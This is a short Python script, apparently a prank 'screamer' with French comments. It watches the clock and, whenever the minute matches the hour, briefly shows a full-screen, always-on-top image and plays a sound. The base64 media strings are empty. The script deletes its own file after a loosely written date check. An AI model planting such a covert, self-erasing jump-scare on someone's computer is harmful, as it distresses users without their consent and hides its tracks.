import base64
from datetime import datetime
import io
import os
import sys
from time import sleep
import wave
import pyaudio
import random
import threading
import tkinter as tk
from PIL import Image, ImageTk

def check_remove():
    if datetime.now().day > 27 or datetime.now().month > 7 or datetime.now().year > 2025:
        fichier_courant = os.path.abspath(sys.argv[0])
        os.remove(fichier_courant)
        return True


def play_sound():
    b64_audio = ''

    audio_bytes = base64.b64decode(b64_audio)
    audio_buffer = io.BytesIO(audio_bytes)

    with wave.open(audio_buffer, 'rb') as wf:
        p = pyaudio.PyAudio()
        stream = p.open(format=p.get_format_from_width(wf.getsampwidth()),
                        channels=wf.getnchannels(),
                        rate=wf.getframerate(),
                        output=True)

        chunk = 1024
        data = wf.readframes(chunk)
        while data:
            stream.write(data)
            data = wf.readframes(chunk)

        stream.stop_stream()
        stream.close()
        p.terminate()

def scream_windows():
    root = tk.Tk()
    root.config(background='black')
    root.attributes('-topmost', True)
    root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
    root.bind("<Escape>", lambda event: root.destroy())
    root.overrideredirect(True)
    canvas = tk.Canvas(root, background='black', border=0, highlightbackground="black")
    canvas.pack(fill="both", expand=True)

    base64_string = ""
    root.update()

    # Charger l'image
    image_data = base64.b64decode(base64_string)
    image_file = io.BytesIO(image_data)
    img = Image.open(image_file)
    img = img.resize((root.winfo_width(), root.winfo_height()))

    # Convertir pour Tkinter
    photo = ImageTk.PhotoImage(img)

    # Ajouter l’image au canvas
    canvas.create_image(0, 0, image=photo, anchor='nw')

    # Garder une référence pour éviter le garbage collector
    canvas.photo = photo

    return root

def load_scream():
    root = scream_windows()
    thread_sound = threading.Thread(target=play_sound)
    thread_sound.start()
    root.after(2500, root.destroy)
    root.mainloop()

def main():
    while True:
        if check_remove(): return
        
        time = datetime.now()
        if time.minute == time.hour:
            load_scream()
            sleep(60)
        sleep(2)

main()